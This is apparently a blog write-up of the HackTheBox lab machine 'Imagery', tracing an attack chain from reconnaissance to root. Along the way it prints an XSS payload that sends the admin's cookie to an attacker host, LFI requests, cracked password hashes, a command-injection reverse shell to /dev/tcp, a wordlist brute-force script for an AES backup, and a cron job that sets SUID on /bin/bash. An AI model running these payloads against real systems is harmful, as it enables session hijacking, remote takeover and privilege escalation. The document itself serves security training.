---
title: HTB Imagery
published: 2025-10-05
description: Imagery is a Linux medium machine of season 9, we will learn Stored XSS | LFI | Backend Enumeration | Code Review | OS Command Injection | AES Decryption | Script developement | Abusing charcol
image: 'https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/662ccbe3935d62aee031d620014adac4.png'
tags: [Linux, Medium, HackTheBox, Web Hacking]
category: Writeup
draft: false
password: "delorianprotected"
---

# Imagery

## Recon

As always, we start off by performing a `TCP` port scan using `nmap`&#x20;

```bash
nmap --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.193.255
```

```bash
# Nmap 7.95 scan initiated Sun Sep 28 11:14:37 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.193.255
Nmap scan report for 10.129.193.255
Host is up, received user-set (0.043s latency).
Scanned at 2025-09-28 11:14:37 WEST for 21s
Not shown: 60067 closed tcp ports (reset), 5466 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 28 11:14:58 2025 -- 1 IP address (1 host up) scanned in 21.12 seconds
```

We see that `TCP Port 22 | SSH` and `TCP Port 800 | HTTP-ALT` are open, this one running on `Werkzeug 3.1.3` which is a web application that runs on `python`

&#x20;let's check what's inside the website running on `TCP Port 8000`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FEDKMvaTsziPky9iVzxxM%2Fimage.png?alt=media&#x26;token=d9bfb073-df24-4098-b430-36e0ddf3fb51" alt=""><figcaption></figcaption></figure>

We see that we can register as well, after the registration we see a new dashboard where we can upload images\\

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FElfkg4lvvvC68KFk3w9j%2Fimage.png?alt=media&#x26;token=6fa0bb2c-4f2f-4e0c-9177-1c717b08672e" alt=""><figcaption></figcaption></figure>

But nothing appears to be injectable for now here

From here, after applying some lateral thinking we notice a weird endpoint at the bottom of the webpage:

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FcIH5wR6nx05cAl2gY6T6%2Fimage.png?alt=media&#x26;token=b3f249de-ab7c-4038-956f-82ab769ac0e1" alt=""><figcaption></figcaption></figure>

Here we see a report form, and if we send it:

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FT7gxbqLyL33VMK4n9I3A%2Fimage.png?alt=media&#x26;token=2d8e6d29-2522-4240-bdc8-eadb30762968" alt=""><figcaption></figcaption></figure>

As we can see, the Admin is going to review our form that we sent, this gives us a clear hint on what we need to do next.

## Stored / Persistent XSS on Report Bug Form

&#x20;We need to send a malicious `XSS payload` that retrieves the admin's `cookies` to our local server after he loads the `payload`, hence showing us the cookies explicitly.

We're going to use the following payload:

```javascript
<img src=1 onerror="document.location='http://IP:PORT/a/'+ document.cookie"><\img>
```

And in our `Python HTTP Server` we see the following output

```python
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.193.255 - - [28/Sep/2025 11:38:05] code 404, message File not found
10.129.193.255 - - [28/Sep/2025 11:38:05] "GET /a/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNkQEQ.0Jwud8-uYfaHRvEM_Cidpdv9bzI HTTP/1.1" 404 -
10.129.193.255 - - [28/Sep/2025 11:38:05] code 404, message File not found
10.129.193.255 - - [28/Sep/2025 11:38:05] "GET /favicon.ico HTTP/1.1" 404 -
```

Which outputs the `session cookie` of the Admin User, so we hijack the cookies using `Firefox`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FdttQu4BwTd5NVbWNSYK2%2Fimage.png?alt=media&#x26;token=096459b6-8000-47d2-8069-3decc6396c8e" alt=""><figcaption></figcaption></figure>

But after trying to access the admin panel the website crashes by redirecting us to the &#x20;

```python
http://10.10.14.102/a/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNkQEQ.0Jwud8-uYfaHRvEM_Cidpdv9bzI
```

This happens because we're getting the `reflected XSS` to fix this we're going to use `burp-suite's intercept` so we control which requests are forwarded or not

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FQObIaIxJgtMEAkaFwbkE%2Fimage.png?alt=media&#x26;token=00e6d708-1f95-4677-9a9e-30fef0983f0f" alt=""><figcaption></figcaption></figure>

And now we're able to see the admin panel properly

## LFI in get\_system\_log

After inspecting a bit, we see that when we try to use the `Download Log` function it tries to retrieve a file from the system, hence giving us hint on what we should do, in this case, performing an `LFI (Local File Inclusion)` so we send  this request to `burp's repeater` with `Ctrl + R` and try to look for `arbitrary files` on the system (e.g `../../../../etc/passwd`)

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F04JoX9TW2spsF7Q9ehaj%2Fimage.png?alt=media&#x26;token=4f18948b-7875-4c9e-8f58-2dec2c6d2f51" alt=""><figcaption></figcaption></figure>

And voilah, we succeeded at the `LFI`&#x20;

After enumerating some more we don't see any `SSH Key( id_rsa)` that we can enumerate, so as we know this is running on `Werkzeug` and the system has a `web` user

## Web Backend Enumeration

Let's try to enumerate his current directory with the use of `/proc/self/cwd/` which is a symbolic link of the `CWD` `(current working directory)` of the user running the web, in this case: `web`&#x20;

Let's try to look for the `app.py` file as it's in most of the web servers running on `Werkzeug`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fk2GLQcmysWS6Wi4gur6W%2Fimage.png?alt=media&#x26;token=1b6f2fee-a2a1-485e-87b2-1e381990486b" alt=""><figcaption></figcaption></figure>

This helps us understand how everything is working at a better glance, it's importing stuff content `config` which means that a `config.py` file is available, same goes for `utils.py`&#x20;

Let's try to enumerate the `config.py` file and see what it contains

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FlvabjzeiNXcNfH8b0iB3%2Fimage.png?alt=media&#x26;token=edcfa9d2-bca6-4156-9b62-6c9eb8a6d69e" alt=""><figcaption></figcaption></figure>

We see that `data` is stored at a file called `db.json` and after enumerating that file with the same process we get the following output:&#x20;

```python
                     --------------- SNIP ------------

{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
                     --------------- SNIP ------------
```

So we got a `md5 hash` for the `testuser` and the `admin` user!! let's crack them with [crackstation](https://crackstation.net/)

```javascript
2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

## Backend code review

We've got access to the `testuser` so login through the `web` to it:

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F8V8Z4oKxoARKEfAWxgXK%2Fimage.png?alt=media&#x26;token=7b4cdc13-ce06-43ba-ba8a-baea7848c9da" alt=""><figcaption></figcaption></figure>

And after uploading an image and accessing to the `Gallery dashboard`, we see that we've got some options that are not blanked anymore

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fto68vnvpJzs67Br2g1l7%2Fimage.png?alt=media&#x26;token=f4d16010-9c4d-4826-8935-3cab3c0fbb51" alt=""><figcaption></figcaption></figure>

Remember that we got full access to the `web backend`? Let's try to enumerate  from these functions from `app.py` as we did earlier but with the  focus to to audit the `code` and potentially find attack `vectors`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FO4LJZvi8fsfJstx3NwGF%2Fimage.png?alt=media&#x26;token=bd802b23-72e1-4378-ae83-92f123af3335" alt=""><figcaption></figcaption></figure>

We see that it's importing the `os` library which gives us a hint: It's executing `system commands`, we also see both `api_manage` and `api_edit` which could be related to the options we saw earlier in the `Gallery dashboard`&#x20;

After carefully inspecting the code, we don't seem to find anything in `api_manage.py` &#x20;

In the other hand, `api_edit.py` crop function seems vulnerable to `command injection`&#x20;

```python
   if transform_type == 'crop':
        x = str(params.get('x'))
        y = str(params.get('y'))
        width = str(params.get('width'))
        height = str(params.get('height'))
        command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
        subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

constructs a shell command using untrusted input and executes it with `shell=True` This allows us to take control of the interpolated values `e.g x, y, width, height` to inject `shell commands` and `execute arbitrary commands` as the web process user.

## Foothold: Command Injection

So let's `intercept` the crop function on the web with `burp` and send it to `repeater`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FVC7LoylD3dMBhp0NQRM5%2Fimage.png?alt=media&#x26;token=5573cb94-0da3-4a79-b663-2345377b9bf8" alt=""><figcaption></figcaption></figure>

As we can see the code is reflecting, showing us web as the user with the command `whoami`,&#x20;

now let's execute a Bash TCP Reverse shell with the following payload

```bash
$(bash -c 'bash -i >& /dev/tcp/10.10.x.x/PORT 0>&1')
```

And set up our listener with `netcat` so we receive the `reverse shell`&#x20;

```bash
❯ nc -lvnp 1920
Listening on 0.0.0.0 1920
Connection received on 10.129.193.255 42310
bash: cannot set terminal process group (1390): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$ 
```

## AES Decrypt Script Development

After a lot of enumeration we see a AES Encrypted file on the /var/backup directory

```python
web@Imagery:~/web$ ls /var/backup
web_20250806_120723.zip.aes
```

So let's transfer it to our local host and try to `crack` it

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F8MPYWaF2c4w33Ty4PVwU%2Fimage.png?alt=media&#x26;token=f4931d9c-7d74-4bbf-9b9f-b9c2aab24fae" alt=""><figcaption></figcaption></figure>

The `AES encryption method` needs a `passphrase` to `crack` it, so we're going to develop a `python` script that `brute-forces` this `passpharse` with the use of the `rockyou.txt` wordlist and then decrypts the file itself with the `pyAesCrypt` module:

```python
import pyAesCrypt
import os
import sys

def decrypt_with_password(encrypted_file, output_file, password, buffer_size=64*1024):
    """Attempt to decrypt a file with given password"""
    try:
        pyAesCrypt.decryptFile(encrypted_file, output_file, password, buffer_size)
        
        # Check if the output file was actually created and has content
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            return True
        else:
            # Clean up empty file if decryption failed but no exception was raised
            if os.path.exists(output_file):
                os.remove(output_file)
            return False
            
    except ValueError as e:
        # This exception is raised when the password is incorrect or file is corrupted
        if "Wrong password" in str(e) or "Corrupted file" in str(e):
            return False
        else:
            print(f"Unexpected ValueError with password '{password}': {e}")
            return False
    except Exception as e:
        print(f"Unexpected error with password '{password}': {e}")
        return False

def main():
    # File paths
    encrypted_file = "web_20250806_120723.zip.aes"
    output_file = "web_20250806_120723.zip"
    wordlist_path = "/usr/share/seclists/rockyou.txt"
    
    # Check if files exist
    if not os.path.exists(encrypted_file):
        print(f"Error: Encrypted file '{encrypted_file}' not found!")
        return
    
    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist '{wordlist_path}' not found!")
        return
    
    # Buffer size
    buffer_size = 64 * 1024
    
    print(f"Attempting to decrypt '{encrypted_file}' using passwords from '{wordlist_path}'")
    print("This may take a while...\n")
    
    # Try passwords from the wordlist
    passwords_tried = 0
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                password = password.strip()
                
                # Skip empty lines
                if not password:
                    continue
                
                passwords_tried += 1
                
                # Print progress every 1000 attempts
                if passwords_tried % 1000 == 0:
                    print(f"Tried {passwords_tried} passwords... Current: '{password}'")
                
                # Try to decrypt with current password
                if decrypt_with_password(encrypted_file, output_file, password, buffer_size):
                    print(f"\n[SUCCESS] Password found: '{password}'")
                    print(f"File decrypted as: '{output_file}'")
                    print(f"Total passwords tried: {passwords_tried}")
                    return
                    
    except KeyboardInterrupt:
        print(f"\n\nProcess interrupted by user after trying {passwords_tried} passwords.")
        return
    except Exception as e:
        print(f"\nError: {e}")
        return
    
    print(f"\n[FAILURE] Password not found in the wordlist. Tried {passwords_tried} passwords.")

if __name__ == "__main__":
    main()
```

So first off we activate the `python venv` and install the `pyAesCrypt` library

```python
❯ python3 -m venv .env && source .env/bin/activate && pip3 install pyAesCrypt
```

And finally we execute&#x20;

```python
❯ python3 decrypt.py
Attempting to decrypt 'web_20250806_120723.zip.aes' using passwords from '/usr/share/seclists/rockyou.txt'
This may take a while...


[SUCCESS] Password found: 'bestfriends'
File decrypted as: 'web_20250806_120723.zip'
Total passwords tried: 670
```

We successfully cracked the `AES` file and the passphrase is: `bestfriends` so we unzip the file

```bash
unzip web_20250806_120723.zip
```

And we see that it's a `web backup` and after enumerating a bit we notice that the `db.json` file now also contains the `mark` user password hash

```bash
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
```

So we crack it with [crackstation](https://crackstation.net/) as we did with `testuser` earlier:

```java
01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

## Privilege Escalation: Abusing Charcol

```bash
web@Imagery:/var/backup$ su mark
Password: supersmash
mark@Imagery:/var/backup$ 
```

We see that the credential successfully worked so it's time to escalate to the `root` user

And after some enumeration we see this

```bash
mark@Imagery:/var/backup$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
mark@Imagery:/var/backup$ 
```

We try execute it

```bash
mark@Imagery:/var/backup$ sudo /usr/local/bin/charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0


Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help
mark@Imagery:/var/backup$ 
```

So we try to check the help manual using `--help`&#x20;

```bash
mark@Imagery:/var/backup$ sudo /usr/local/bin/charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
mark@Imagery:/var/backup$ 
```

As we see, we can reset the password to it's default using the  -R parameter, so let's try to do it

```bash
mark@Imagery:/var/backup$ sudo charcol -R

Attempting to reset Charcol application password to default.
[2025-09-28 12:19:44] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-28 12:19:48] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
mark@Imagery:/var/backup$ sudo charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-09-28 12:19:58] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
mark@Imagery:/var/backup$ sudo charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-09-28 12:20:03] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> 
```

Now we got access to the `charcol shell` and after typing help a `help manual` appears on the output

Something catches our attention instantly

```bash
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
```

You can summon a `cron job` that spawns a `shell command`, and this is executed as `root`

Let's try to change the `/bin/bash` permissions so we can access a `privleged bash` &#x20;

```bash
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "privesc"
[2025-09-28 12:23:57] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-28 12:24:00] [INFO] System password verified successfully.
[2025-09-28 12:24:00] [INFO] Auto job 'privesc' (ID: 9ff73c4c-233f-4205-b9d0-dc7aabf0d8d8) added successfully. The job will run according to schedule.
[2025-09-28 12:24:00] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod u+s /bin/bash
```

And if we do

```bash
mark@Imagery:/var/backup$ bash -p
bash-5.2# whoami
root
bash-5.2# 
```

We get a shell as the `root` user!

Thank you for reading this writeup, I hope it helped a lot and see you next time!
